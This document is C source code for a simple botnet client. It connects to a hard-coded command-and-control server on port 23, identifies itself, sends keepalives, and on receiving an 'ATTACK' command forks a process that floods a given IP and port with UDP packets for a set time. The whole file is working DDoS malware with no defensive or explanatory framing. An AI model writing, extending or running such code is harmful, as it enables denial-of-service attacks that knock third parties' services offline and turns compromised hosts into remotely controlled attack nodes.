#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>

#define CNC_IP "172.16.193.190"
#define CNC_PORT 23
#define BUFFER_SIZE 1024

int sock_cnc = -1;
int running = 1;

// Simple UDP flood
void udp_flood(char *target_ip, int target_port, int duration) {
    int sock;
    struct sockaddr_in target;
    char packet[1472];
    time_t start;
    int i;
    unsigned long packets = 0;
    
    printf("[Bot] Starting UDP flood to %s:%d for %d seconds\n", target_ip, target_port, duration);
    
    // Fill packet with random data
    for (i = 0; i < sizeof(packet); i++) {
        packet[i] = rand() % 255;
    }
    
    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[Bot] Failed to create UDP socket\n");
        return;
    }
    
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);
    
    start = time(NULL);
    
    // Send packets for duration
    while (time(NULL) - start < duration && running) {
        for (i = 0; i < 100; i++) {
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
            packets++;
        }
        usleep(100);
    }
    
    close(sock);
    printf("[Bot] UDP flood completed - %lu packets sent\n", packets);
}

// Parse attack command
void parse_attack(char *cmd) {
    char type[16], target[32];
    int port, duration;
    
    sscanf(cmd, "%s %s %d %d", type, target, &port, &duration);
    printf("[Bot] Attack command: %s %s %d %d\n", type, target, port, duration);
    
    if (strcmp(type, "udp") == 0 || strcmp(type, "UDP") == 0) {
        udp_flood(target, port, duration);
    } else {
        printf("[Bot] Unknown attack type: %s\n", type);
    }
}

// Connect to CNC
int connect_cnc() {
    struct sockaddr_in cnc_addr;
    
    sock_cnc = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_cnc < 0) {
        perror("socket");
        return 0;
    }
    
    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_port = htons(CNC_PORT);
    inet_pton(AF_INET, CNC_IP, &cnc_addr.sin_addr);
    
    printf("[Bot] Connecting to CNC %s:%d...\n", CNC_IP, CNC_PORT);
    
    if (connect(sock_cnc, (struct sockaddr *)&cnc_addr, sizeof(cnc_addr)) < 0) {
        perror("connect");
        close(sock_cnc);
        sock_cnc = -1;
        return 0;
    }
    
    printf("[Bot] Connected to CNC!\n");
    return 1;
}

// Send bot identification
void send_identification() {
    // Send bot identification header
    unsigned char header[] = {0x00, 0x00, 0x00, 0x01};  // Bot ID
    send(sock_cnc, header, 4, 0);
    
    // Send version (0)
    unsigned char version = 0x00;
    send(sock_cnc, &version, 1, 0);
    
    // Send source string length (0)
    unsigned char src_len = 0x00;
    send(sock_cnc, &src_len, 1, 0);
    
    printf("[Bot] Identification sent\n");
}

int main() {
    char buffer[BUFFER_SIZE];
    int n;
    fd_set readfds;
    struct timeval tv;
    
    printf("[Bot] Simple Bot starting...\n");
    printf("[Bot] PID: %d\n", getpid());
    
    srand(time(NULL) ^ getpid());
    
    // Connect to CNC
    while (!connect_cnc()) {
        printf("[Bot] Retrying in 5 seconds...\n");
        sleep(5);
    }
    
    // Send identification
    send_identification();
    
    // Main loop
    while (running) {
        FD_ZERO(&readfds);
        FD_SET(sock_cnc, &readfds);
        
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        
        int ret = select(sock_cnc + 1, &readfds, NULL, NULL, &tv);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        } else if (ret == 0) {
            // Timeout - send keepalive
            send(sock_cnc, "PING\n", 5, 0);
            continue;
        }
        
        if (FD_ISSET(sock_cnc, &readfds)) {
            n = recv(sock_cnc, buffer, BUFFER_SIZE - 1, 0);
            
            if (n <= 0) {
                printf("[Bot] CNC disconnected\n");
                break;
            }
            
            buffer[n] = '\0';
            printf("[Bot] Received: %s", buffer);
            
            // Check for attack command
            if (strncmp(buffer, "ATTACK", 6) == 0) {
                // Fork to run attack in background
                int pid = fork();
                if (pid == 0) {
                    // Child process - run attack
                    parse_attack(buffer + 7);
                    exit(0);
                }
            }
        }
    }
    
    close(sock_cnc);
    printf("[Bot] Shutting down\n");
    return 0;
}
